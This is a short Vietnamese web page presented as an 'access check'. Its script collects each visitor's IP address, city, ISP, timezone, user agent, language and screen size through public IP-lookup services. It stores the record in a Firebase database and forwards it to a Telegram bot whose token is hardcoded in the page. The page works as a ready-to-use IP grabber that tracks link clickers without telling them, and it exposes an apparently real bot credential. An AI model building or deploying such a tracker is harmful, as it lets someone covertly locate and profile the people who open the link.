<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Kiểm tra truy cập</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<h2>Xin chào</h2>
<p id="status">Đang kiểm tra...</p>
<pre id="log" style="background:#111;color:#0f0;padding:10px;font-size:12px;white-space:pre-wrap"></pre>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const app = initializeApp({
  databaseURL: "https://shopmduy-default-rtdb.asia-southeast1.firebasedatabase.app/"
});
const db = getDatabase(app);

const BOT_TOKEN = "8314558446:AAFGz92fVeLdomzfN0EeNZk-HFtDSC8hHEg";
const CHAT_ID = "DIEN_CHAT_ID_CUA_BAN";

const logEl = document.getElementById("log");
function log(msg) {
  console.log(msg);
  logEl.textContent += msg + "\n";
  document.getElementById("status").textContent = msg;
}

async function getIP() {
  const services = [
    { url: "https://ipwho.is/", map: d => ({
        ip: d.ip, city: d.city, region: d.region, country: d.country,
        org: d.connection && d.connection.isp, timezone: d.timezone && d.timezone.id
    })},
    { url: "https://ipapi.co/json/", map: d => ({
        ip: d.ip, city: d.city, region: d.region, country: d.country_name,
        org: d.org, timezone: d.timezone
    })},
    { url: "https://api.ipify.org?format=json", map: d => ({
        ip: d.ip, city: "?", region: "?", country: "?", org: "?", timezone: "?"
    })}
  ];

  for (const s of services) {
    try {
      log("Thử " + s.url);
      const r = await fetch(s.url, { cache: "no-store" });
      if (!r.ok) throw new Error("HTTP " + r.status);
      const d = await r.json();
      const m = s.map(d);
      if (!m.ip) throw new Error("Không có IP trong response");
      log("OK: IP = " + m.ip);
      return m;
    } catch (e) {
      log("Fail " + s.url + " -> " + e.message);
    }
  }
  throw new Error("Cả 3 dịch vụ IP đều fail");
}

async function saveFirebase(record) {
  log("Ghi Firebase...");
  try {
    const result = await push(ref(db, "visits"), record);
    log("Firebase OK, key=" + result.key);
    return result.key;
  } catch (e) {
    log("Firebase FAIL: " + e.message);
    throw e;
  }
}

async function sendTelegram(text) {
  log("Gửi Telegram...");
  const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
  try {
    const r = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
    });
    const d = await r.json();
    if (!d.ok) {
      log("Telegram FAIL: " + d.description);
      throw new Error(d.description);
    }
    log("Telegram OK");
    return true;
  } catch (e) {
    log("Telegram lỗi mạng: " + e.message);
    throw e;
  }
}

(async () => {
  try {
    log("Bắt đầu");
    const info = await getIP();

    const record = {
      ip: info.ip,
      city: info.city || "?",
      region: info.region || "?",
      country: info.country || "?",
      org: info.org || "?",
      timezone: info.timezone || "?",
      userAgent: navigator.userAgent,
      language: navigator.language,
      screen: screen.width + "x" + screen.height,
      time: new Date().toISOString(),
      sent: false
    };

    log("Dữ liệu: " + JSON.stringify(record));

    const key = await saveFirebase(record);

    const text =
      "🔎 Lượt truy cập mới\n" +
      "IP: " + record.ip + "\n" +
      "Nhà mạng: " + record.org + "\n" +
      "Khu vực: " + record.city + ", " + record.region + ", " + record.country + "\n" +
      "Thiết bị: " + record.screen + " | " + record.language + "\n" +
      "UA: " + record.userAgent;

    await sendTelegram(text);
    log("XONG. key=" + key);
  } catch (e) {
    log("DỪNG: " + e.message);
  }
})();
</script>
</body>
</html>
